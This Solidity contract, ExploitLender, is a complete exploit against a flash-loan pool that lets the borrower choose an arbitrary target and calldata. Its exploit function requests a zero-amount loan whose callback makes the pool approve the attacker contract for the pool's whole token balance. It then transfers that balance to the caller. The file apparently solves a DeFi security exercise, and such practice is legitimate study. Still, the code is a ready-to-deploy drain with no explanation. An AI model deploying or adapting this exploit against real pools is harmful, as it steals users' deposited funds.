// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract ExploitLender {
    IPool immutable i_pool;
    address tokenAddress;
    address poolAddress;

    constructor(address _pool, address _token) {
        tokenAddress = _token;
        poolAddress = _pool;
        i_pool = IPool(_pool);
    }

    function exploit() public {
        uint256 poolBalance = IERC20(tokenAddress).balanceOf(poolAddress);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );

        i_pool.flashLoan(0, msg.sender, tokenAddress, data);
        IERC20(tokenAddress).transferFrom(poolAddress, msg.sender, poolBalance);
    }
}
